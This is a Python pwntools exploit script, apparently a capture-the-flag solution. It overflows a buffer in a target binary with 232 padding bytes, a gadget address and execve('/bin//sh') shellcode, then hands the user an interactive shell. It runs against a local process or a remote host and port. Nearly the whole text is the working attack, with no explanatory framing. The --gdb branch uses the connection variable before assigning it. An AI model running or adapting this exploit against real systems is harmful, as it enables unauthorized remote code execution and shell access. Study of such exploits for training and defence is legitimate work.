from pwn import *
import sys
from os import path
import argparse

def do_stuff(r):
	r.recvuntil("(leave)")
	r.sendline("2")
	r.recvuntil("now")
	r.recvline()
	gadget_addr = p64(0x0000000000400827)
	shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
	r.sendline("A" * 232 + gadget_addr + shellcode)
	r.recvuntil("(leave)")
	print("Keep typing 6,enter until you get a shell")
	r.interactive()
	
if __name__ == "__main__":
	# Help case
	if len(sys.argv) == 2 and sys.argv[1] in ("-h", "--help", "--wut"):
		log.info("Remote Usage: {} [host] [port]\nLocal Usage: {} [executable]\nSSH: {} [host] [port] [user] [pasword]".format(sys.argv[0], sys.argv[0], sys.argv[0]))
	# 1 arguments means run local executable
	elif len(sys.argv) == 2 or (len(sys.argv) == 3 and sys.argv[2] == "--gdb"):
		# Parse
		if path.isfile(sys.argv[1]):
			# Start process and call helper
			r = process(sys.argv[1])
			do_stuff(r)
			r.close()
		elif len(sys.argv) == 3 and sys.argv[2] == "--gdb":
			gdb.attach(r, "b *0x0000000000400a74")
			do_stuff(r)
			r.close()
		else:
			log.error("No such file")
	# 2 arguments means remote connection	
	elif len(sys.argv) == 3:
		# Parse
		host = sys.argv[1]
		try:
			port = int(sys.argv[2])
		except:
			log.error("Port must be a number")
		# Setup connection and call helper
		r = remote(host, port)
		do_stuff(r)
		r.close()
